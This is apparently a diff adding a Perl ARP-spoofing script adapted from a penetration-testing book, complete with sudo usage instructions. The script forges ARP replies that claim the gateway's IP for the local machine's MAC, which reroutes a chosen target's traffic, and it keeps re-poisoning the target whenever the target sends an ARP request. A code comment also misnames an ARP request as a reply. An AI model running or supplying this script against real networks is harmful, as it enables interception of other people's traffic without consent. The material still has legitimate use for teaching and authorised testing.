@@ -1,0 +1,84 @@
+#!/usr/bin/env perl
+############################################################
+# Adapted from Penetration Testing With Perl                #
+# by Douglas Berdeaux                                       #
+# Chapter 4 IEEE 802.3 Wired Network Manipulation With Perl #
+#############################################################
+
+=head2 SYNOPSIS
+
+This program attempts to spoof a target host into routing its traffic via
+the machine running this program.
+
+Run with system Perl:
+
+  $ sudo ./arp_spoof <target ip address>
+
+Run with plenv or perlbrew:
+
+  $ sudo $(which perl) arp_spoof <target ip address>
+
+=cut
+
+use strict;
+use warnings;
+use feature 'say';
+use Net::ARP;
+use Net::Frame::Device;
+use Net::Frame::Dump::Online;
+use Net::Frame::Simple;
+use Net::Pcap;
+
+my $target_ip = $ARGV[0] or die "Usage\n\t./arp_spoof <target_ip>\n";
+my $target_mac = Net::Frame::Device->new(target => $target_ip)->mac;
+
+my ($filter, $net, $mask) = ("") x 3;
+
+my $network_device_name = pcap_lookupdev(\my $err);
+my $device = Net::Frame::Device->new(dev => $network_device_name);
+
+pcap_lookupnet($network_device_name, \$net, \$mask, \$err);
+
+my $filterStr = '(arp)&&(ether dst ' . $device->mac . ")&&(ether src $target_mac)";
+
+my $pcap = Net::Frame::Dump::Online->new(
+  dev           => $network_device_name,
+  filter        => $filterStr,
+  promisc       => 0,
+  unlinkOnStop  => 1,
+  timeoutOnNext => 1000,
+);
+$pcap->start;
+sendARP();
+
+sub sendARP
+{
+  Net::ARP::send_packet(
+    $network_device_name,
+    $device->gatewayIp,
+    $target_ip,
+    $device->mac,
+    $target_mac,
+    "reply",
+  );
+  arpspoof(); # now wait for packets
+}
+
+sub arpspoof
+{
+  until ($pcap->timeout)
+  {
+    if (my $frame = $pcap->next)
+    {
+      my $fref = Net::Frame::Simple->newFromDump($frame);
+      if($fref->ref->{ARP}->opCode == 1)
+      {
+        say "[-] got request from target, sending reply";
+        sendARP(); # opCode 1 (reply)
+      }
+    }
+  }
+}
+
+# Clean up the pcap dump
+END { $pcap->stop if $pcap; say 'Exiting.'; }
